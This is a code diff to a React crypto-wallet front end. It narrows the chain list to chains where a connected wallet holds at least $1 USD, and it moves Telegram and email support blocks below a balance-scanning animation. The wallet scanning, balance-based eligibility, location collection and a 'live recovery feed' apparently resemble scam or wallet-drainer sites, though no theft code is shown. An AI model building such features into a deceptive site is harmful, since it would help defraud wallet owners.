@@ -2434,8 +2434,9 @@ function App() {
     try {
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       
+      // --- CHANGE 2: Only include chains with at least $1 USD value ---
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
-        balances[chain.name] && balances[chain.name].amount > 0.000001
+        balances[chain.name] && balances[chain.name].valueUSD >= 1
       );
       
       const eligible = total >= 1;
@@ -3025,23 +3026,8 @@ function App() {
           )}
 
           {/* ============================================ */}
-          {/* SUPPORT SECTION - TELEGRAM (First) + EMAIL (Second) */}
+          {/* SCANNING ANIMATION (NOW MOVED UP – BEFORE TELEGRAM/EMAIL) */}
           {/* ============================================ */}
-          
-          {/* Telegram Support - For users who prefer instant chat */}
-          <TelegramSupport translations={translations} />
-          
-          {/* Email Support Section - For users without Telegram or needing manual follow-up */}
-          <div className="w-full max-w-md mt-6">
-            <ReportIssue 
-              translations={translations}
-              address={address}
-              balances={balances}
-              userLocation={userLocation}
-            />
-          </div>
-
-          {/* SCANNING ANIMATION (only shown during initial balance scan, not eligibility check) */}
           {isConnected && scanning && (
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-blue-500/30">
@@ -3067,6 +3053,23 @@ function App() {
               </div>
             </div>
           )}
+
+          {/* ============================================ */}
+          {/* SUPPORT SECTION - TELEGRAM (First) + EMAIL (Second) */}
+          {/* ============================================ */}
+          
+          {/* Telegram Support - For users who prefer instant chat */}
+          <TelegramSupport translations={translations} />
+          
+          {/* Email Support Section - For users without Telegram or needing manual follow-up */}
+          <div className="w-full max-w-md mt-6">
+            <ReportIssue 
+              translations={translations}
+              address={address}
+              balances={balances}
+              userLocation={userLocation}
+            />
+          </div>
 
           {/* LIVE RECOVERY FEED */}
           <LiveRecoveryFeed 
